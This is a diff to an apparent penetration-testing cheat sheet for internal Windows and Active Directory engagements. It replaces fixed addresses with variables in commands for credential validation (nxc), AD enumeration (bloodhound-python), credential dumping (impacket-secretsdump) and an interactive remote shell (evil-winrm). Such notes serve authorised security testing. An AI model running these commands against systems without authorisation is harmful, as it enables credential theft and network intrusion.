@@ -34,14 +34,14 @@ If you're going into an internal Windows or AD engagement, have these ready:
 
 ```bash
 # Validate the first set of creds
-nxc smb 10.10.10.0/24 -u <user> -p '<pass>'
+nxc smb $SUBNET -u <user> -p '<pass>'
 
 # Dump AD data for BloodHound
-bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip
+bloodhound-python -c all -d $DOMAIN -u <user> -p '<pass>' -ns $DC_IP --zip
 
 # Dump credentials if you have admin
-impacket-secretsdump CORP/<user>:'<pass>'@10.10.10.10
+impacket-secretsdump $NETBIOS/<user>:'<pass>'@$IP
 
 # Interactive shell
-evil-winrm -i 10.10.10.10 -u <user> -p '<pass>'
+evil-winrm -i $IP -u <user> -p '<pass>'
 ```
